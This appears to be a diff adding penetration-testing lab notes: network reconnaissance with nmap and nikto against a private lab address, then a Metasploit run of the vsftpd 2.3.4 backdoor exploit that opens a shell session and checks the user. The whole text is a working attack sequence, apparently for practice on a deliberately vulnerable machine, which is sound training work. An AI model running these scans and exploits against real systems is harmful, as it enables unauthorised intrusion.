@@ -1,0 +1,18 @@
+-  ip a
+-  ping 192.168.56.102
+-  nmap -sS -sV -O 192.168.56.102
+-  nikto help
+-  nikto -host 192.168.56.102
+-  nikto -host 192.168.56.102 >> nikto_scan.txt
+-  vim nikto_scan.txt
+# Start Metasploit Framework
+msfconsole
+
+# Exploit 1: vsftpd 2.3.4 Backdoor
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.102
+run
+sessions
+sessions -i 1
+whoami
+exit
